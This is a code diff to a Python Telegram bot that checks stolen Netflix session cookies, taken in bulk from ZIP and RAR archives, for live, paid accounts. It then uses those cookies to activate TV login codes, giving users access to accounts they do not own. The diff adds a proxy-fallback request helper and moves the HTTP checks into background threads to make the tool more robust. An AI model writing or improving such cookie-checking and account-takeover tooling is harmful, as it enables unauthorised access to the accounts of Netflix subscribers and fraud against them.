@@ -1,4 +1,5 @@
 # @Atoniz715 Gay Maker
+import asyncio
 import gzip
 import io
 import json
@@ -139,6 +140,33 @@ BASE_HEADERS = {
 }
 
 
+# ========== SAFE REQUEST HELPER WITH PROXY FALLBACK ==========
+def safe_request(
+    method: str, url: str, session: requests.Session, **kwargs
+) -> requests.Response:
+    """Executes an HTTP request. If a proxy error or timeout occurs,
+    it falls back automatically to a direct connection.
+    """
+    if "timeout" not in kwargs:
+        kwargs["timeout"] = REQUEST_TIMEOUT
+
+    try:
+        return session.request(method, url, **kwargs)
+    except (
+        requests.exceptions.ProxyError,
+        requests.exceptions.ConnectTimeout,
+        requests.exceptions.ReadTimeout,
+        requests.exceptions.ConnectionError,
+    ) as e:
+        if PROXIES:
+            logger.warning(
+                f"⚠️ Proxy failed for {url} ({e}). Falling back to direct connection..."
+            )
+            kwargs["proxies"] = {}
+            return session.request(method, url, **kwargs)
+        raise e
+
+
 # ========== HELPER FUNCTIONS ==========
 async def safe_reply(message, text, **kwargs):
     try:
@@ -151,10 +179,7 @@ async def safe_reply(message, text, **kwargs):
 
 # ========== COOKIE VALIDATION HELPER ==========
 def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
-    """Checks if a NetflixId cookie is valid, active, paid, and not on hold.
-
-    Returns (True, "OK") or (False, "Reason").
-    """
+    """Checks if a NetflixId cookie is valid, active, paid, and not on hold."""
     session = requests.Session()
     if PROXIES:
         session.proxies.update(PROXIES)
@@ -168,20 +193,20 @@ def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
         "Referer": "https://www.netflix.com/",
     }
     try:
-        r = session.get(
+        r = safe_request(
+            "GET",
             "https://www.netflix.com/account/membership",
+            session=session,
             headers=headers,
             timeout=10,
             verify=False,
         )
 
-        # 1. Check if session/cookie is invalid or dead
         if r.status_code != 200 or "currentCountry" not in r.text:
             return False, "Dead/Expired Cookie"
 
         lower_text = r.text.lower()
 
-        # 2. Check for Payment On Hold / Billing Issues
         if (
             "payment on hold" in lower_text
             or "update your payment information" in lower_text
@@ -190,7 +215,6 @@ def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
         ):
             return False, "Payment On Hold"
 
-        # 3. Check for Free / Trial / Non-Active Plans
         if "free plan" in lower_text or "no active plan" in lower_text:
             return False, "Free/Inactive Plan"
 
@@ -447,10 +471,11 @@ def submit_tv_code(
     headers["Referer"] = "https://www.netflix.com/tv2"
     headers["Origin"] = "https://www.netflix.com"
 
-    # Step 1: GET /tv2 to obtain authURL
     try:
-        r = session.get(
+        r = safe_request(
+            "GET",
             "https://www.netflix.com/tv2",
+            session=session,
             headers=headers,
             timeout=REQUEST_TIMEOUT,
             verify=False,
@@ -470,7 +495,6 @@ def submit_tv_code(
     if not auth_url:
         return False, None, None, "authURL not found", r.status_code
 
-    # Step 2: POST to /tv2 with code
     payload = {
         "flow": "websiteSignUp",
         "authURL": auth_url,
@@ -485,8 +509,10 @@ def submit_tv_code(
     post_headers["Content-Type"] = "application/x-www-form-urlencoded"
 
     try:
-        r = session.post(
+        r = safe_request(
+            "POST",
             "https://www.netflix.com/tv2",
+            session=session,
             data=payload,
             headers=post_headers,
             timeout=REQUEST_TIMEOUT,
@@ -532,7 +558,14 @@ def fetch_page(netflix_id: str, url: str) -> Tuple[Optional[str], Optional[str]]
         "Referer": "https://www.netflix.com/",
     }
     try:
-        r = sess.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+        r = safe_request(
+            "GET",
+            url,
+            session=sess,
+            headers=headers,
+            timeout=REQUEST_TIMEOUT,
+            verify=False,
+        )
         if r.status_code != 200:
             return None, f"HTTP {r.status_code}"
         content = r.content
@@ -687,13 +720,14 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for cookie_entry in cookies_to_try:
         netflix_id = cookie_entry["NetflixId"]
 
-        ok, final_url, cleaned, err_msg, status = submit_tv_code(
-            netflix_id, tv_code
+        # Run code submission in thread to prevent blocking
+        ok, final_url, cleaned, err_msg, status = await asyncio.to_thread(
+            submit_tv_code, netflix_id, tv_code
         )
         if ok:
             increment_cookie_usage(netflix_id)
             increment_user_login(update.effective_user.id)
-            country, plan = get_country_and_plan(netflix_id)
+            country, plan = await asyncio.to_thread(get_country_and_plan, netflix_id)
             if not country:
                 country = "Unknown"
                 plan = "Unknown"
@@ -818,7 +852,7 @@ async def del_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# ========== FILE HANDLER WITH LIVE & PLAN VALIDATION ==========
+# ========== FILE HANDLER WITH LIVE & PLAN VALIDATION (NON-BLOCKING) ==========
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id not in ADMIN_IDS:
@@ -858,10 +892,11 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await status_msg.edit_text("❌ No valid NetflixId found in the file.")
             return
 
-        # Perform live check
         if status_msg:
             await status_msg.edit_text("🔍 Checking cookie validity and account status...")
-        is_alive, reason = check_if_cookie_alive(netflix_id)
+
+        # Run cookie validation in background thread
+        is_alive, reason = await asyncio.to_thread(check_if_cookie_alive, netflix_id)
 
         if not is_alive:
             if status_msg:
@@ -896,9 +931,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         if status_msg:
-            await status_msg.edit_text(
-                "📦 Unpacking and checking accounts (filtering dead/hold/free)..."
-            )
+            await status_msg.edit_text("📦 Unpacking and checking accounts...")
+
         file = await context.bot.get_file(document.file_id)
         raw_data = await file.download_as_bytearray()
 
@@ -906,43 +940,41 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         rejected = 0
         duplicates = 0
 
-        if file_name.endswith(".zip"):
-            with zipfile.ZipFile(io.BytesIO(raw_data)) as zf:
-                for fname in zf.namelist():
-                    if fname.lower().endswith((".txt", ".json")):
-                        content = zf.read(fname).decode("utf-8", errors="ignore")
-                        netflix_id = extract_netflix_id_from_text(content)
-                        if netflix_id:
-                            is_alive, _ = check_if_cookie_alive(netflix_id)
-                            if is_alive:
-                                success, _ = add_cookie_with_metadata(
-                                    user.id, fname, netflix_id
-                                )
-                                if success:
-                                    added += 1
-                                else:
-                                    duplicates += 1
-                            else:
-                                rejected += 1
+        def process_bulk_files():
+            nonlocal added, rejected, duplicates
+            entries = []
 
-        elif RAR_SUPPORT and file_name.endswith(".rar"):
-            with rarfile.RarFile(io.BytesIO(raw_data)) as rf:
-                for fname in rf.namelist():
-                    if fname.lower().endswith((".txt", ".json")):
-                        content = rf.read(fname).decode("utf-8", errors="ignore")
-                        netflix_id = extract_netflix_id_from_text(content)
-                        if netflix_id:
-                            is_alive, _ = check_if_cookie_alive(netflix_id)
-                            if is_alive:
-                                success, _ = add_cookie_with_metadata(
-                                    user.id, fname, netflix_id
-                                )
-                                if success:
-                                    added += 1
-                                else:
-                                    duplicates += 1
-                            else:
-                                rejected += 1
+            if file_name.endswith(".zip"):
+                with zipfile.ZipFile(io.BytesIO(raw_data)) as zf:
+                    for fname in zf.namelist():
+                        if fname.lower().endswith((".txt", ".json")):
+                            content = zf.read(fname).decode("utf-8", errors="ignore")
+                            nid = extract_netflix_id_from_text(content)
+                            if nid:
+                                entries.append((fname, nid))
+
+            elif RAR_SUPPORT and file_name.endswith(".rar"):
+                with rarfile.RarFile(io.BytesIO(raw_data)) as rf:
+                    for fname in rf.namelist():
+                        if fname.lower().endswith((".txt", ".json")):
+                            content = rf.read(fname).decode("utf-8", errors="ignore")
+                            nid = extract_netflix_id_from_text(content)
+                            if nid:
+                                entries.append((fname, nid))
+
+            for fname, nid in entries:
+                is_alive, _ = check_if_cookie_alive(nid)
+                if is_alive:
+                    success, _ = add_cookie_with_metadata(user.id, fname, nid)
+                    if success:
+                        added += 1
+                    else:
+                        duplicates += 1
+                else:
+                    rejected += 1
+
+        # Run extraction and HTTP checks asynchronously in thread pool
+        await asyncio.to_thread(process_bulk_files)
 
         if status_msg:
             await status_msg.edit_text(
